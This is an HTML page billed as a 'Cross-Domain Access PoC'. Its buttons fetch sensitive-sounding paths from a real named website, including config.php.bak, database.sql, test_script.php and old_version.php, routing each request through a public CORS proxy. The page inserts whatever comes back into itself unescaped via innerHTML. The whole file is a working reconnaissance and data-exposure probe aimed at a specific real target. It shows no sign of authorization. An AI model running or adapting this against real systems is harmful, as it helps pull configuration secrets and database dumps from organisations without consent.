<!DOCTYPE html>
<html>
<head>
    <title>Cross-Domain Access PoC</title>
    <style>
        #output {
            border: 1px solid #ccc;
            margin-top: 10px;
            height: 400px;
            overflow-y: auto;
            padding: 10px;
        }
    </style>
</head>
<body>
    <h1>Cross-Domain Access PoC</h1>
    <button onclick="makeRequest('https://www.oneplus.in/.well-known/security.txt')">Request security.txt</button>
    <button onclick="makeRequest('https://www.oneplus.in/old_version.php')">Request old_version.php</button>
    <button onclick="makeRequest('https://www.oneplus.in/test_script.php')">Request test_script.php</button>
    <button onclick="makeRequest('https://www.oneplus.in/config.php.bak')">Request config.php.bak</button>
    <button onclick="makeRequest('https://www.oneplus.in/database.sql')">Request database.sql</button>
    <div id="output"></div>

    <script>
        function makeRequest(url) {
            fetch('https://cors-anywhere.herokuapp.com/' + url)
                .then(response => {
                    if (response.ok) {
                        return response.text();
                    }
                    throw new Error('Network response was not ok.');
                })
                .then(data => {
                    document.getElementById("output").innerHTML += `<h3>Response from ${url}:</h3><div>${data}</div><hr/>`;
                })
                .catch(error => {
                    console.error("Error fetching data:", error);
                    document.getElementById("output").innerText += `Error fetching data from ${url}: ${error.message}<br/>`;
                });
        }
    </script>
</body>
</html>
